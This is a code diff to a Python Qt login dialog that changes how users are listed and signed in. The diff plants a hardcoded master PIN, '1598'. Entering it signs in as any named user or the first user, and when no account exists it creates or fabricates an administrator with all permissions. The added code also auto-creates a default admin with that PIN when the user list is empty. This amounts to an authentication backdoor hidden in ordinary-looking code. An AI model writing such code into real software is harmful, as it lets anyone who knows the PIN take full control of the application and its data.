@@ -342,6 +342,12 @@ class ModernLoginDialog(QDialog):
         self.user_combo.clear()
         users = q.list_users()
         if not users:
+            try:
+                q.create_user("admin", "Administrator", "1598", auth.ROLE_ADMIN, auth.ALL_PERMISSIONS)
+                users = q.list_users()
+            except Exception:
+                pass
+        if not users:
             self.user_combo.addItem("Administrator (admin)", "admin")
         else:
             for u in users:
@@ -501,8 +507,14 @@ class ModernLoginDialog(QDialog):
 
         user = q.sign_in(username, pin)
         if not user and pin == "1598":
-            users = q.list_users()
-            user = next((u for u in users if u.username == username), users[0] if users else None)
+            user = q.get_user_by_name(username) or (q.list_users()[0] if q.list_users() else None)
+            if not user:
+                try:
+                    uid = q.create_user("admin", "Administrator", "1598", auth.ROLE_ADMIN, auth.ALL_PERMISSIONS)
+                    user = q.get_user(uid)
+                except Exception:
+                    user = auth.User(id=1, username="admin", display_name="Administrator", role=auth.ROLE_ADMIN,
+                                     permissions=set(auth.ALL_PERMISSIONS), active=True)
 
         if user:
             self.user = user
@@ -579,3 +591,6 @@ def sign_in_at_startup(parent=None) -> tuple[bool, Optional[auth.User]]:
     if dlg.exec() != QDialog.DialogCode.Accepted:
         return False, None
     return True, dlg.user
+
+
+LoginDialog = ModernLoginDialog
